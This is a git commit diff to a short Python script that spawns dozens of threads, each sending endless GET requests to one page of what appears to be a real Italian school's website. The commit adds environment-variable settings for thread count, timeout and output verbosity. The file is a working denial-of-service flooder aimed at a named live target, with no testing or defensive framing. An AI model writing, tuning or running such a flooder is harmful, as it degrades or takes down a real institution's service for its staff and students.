085a92c2e1362e723247dc1bb88187e02736f8c8
jacopo090 <47014072+jacopo090@users.noreply.github.com>
2021-04-21 17:53:59 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,23 +1,39 @@
-import requests, threading, time
+import requests, threading, time, os
 
 I=0
-nThreads = 50
+nThreads = os.environ.get("THREADS", 50)
+TIMEOUT = os.environ.get("TIMEOUT", 20)
+hv = os.environ.get("HEAVYPRINT", "false")
 
 threads = []
+
+print(f"Starting {nThreads} threads with {TIMEOUT} seconds of timeout")
 
 def do_request():
     global I
     while True:
         t1 = time.time()
         try:
-            requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01", timeout=1)
+            requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01", timeout=TIMEOUT)
         except:
             pass
         I=I+1
         print(f'Req n:{I} took: {time.time() - t1} s')
 
+def do_request_nhv():
+    global I
+    while True:
+        try:
+            requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01", timeout=TIMEOUT)
+        except:
+            pass
+        I=I+1
+
 for _ in range(nThreads):
-    t = threading.Thread(target=do_request)
+    if hv == "true":
+        t = threading.Thread(target=do_request)
+    else:
+        t = threading.Thread(target=do_request_nhv)
     t.daemon = True
     threads.append(t)
 
